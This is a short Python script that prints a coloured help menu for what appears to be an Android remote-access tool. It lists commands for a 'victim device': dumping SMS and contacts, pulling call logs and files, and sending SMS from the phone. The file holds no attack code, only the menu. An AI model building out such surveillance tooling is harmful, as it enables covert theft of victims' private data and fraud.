from rich.console import Console
from rich.table import Table

table = Table()
table2 = Table()
columns_name=["commands","description"]
rows_section=[["device_info","show device info of victim device"],
              ["InstalledApps","show all installed app of victim device"],
              ["dump_sms","show current first sms"],
              ["dump_contact","dump phonebook contacts"],
              ["get_phone_logs","get call history"],
              ["send_sms,<number>,<text>","send sms from victim device"],
              ["files","show files of victim device"],
              ["cd <dir>","change path dir"],
              ["import <path>","import file from victim device"],
              ["torch on/off","contol torch"]
              ]
row_section2=[["help","show all command"],["clear","clear console"]]
#for column in columns_name:
table.add_column(columns_name[0],style="green")
table.add_column(columns_name[1],style="yellow")
table2.add_column(columns_name[0],style="green")
table2.add_column(columns_name[1],style="yellow")
for row in rows_section:
    table.add_row(*row)
    table.add_row("","")
for row in row_section2:
    table2.add_row(*row)
    table2.add_row("","")


console = Console()
print("                     remote commands ")
console.print(table)
print("         os commands ")
console.print(table2)

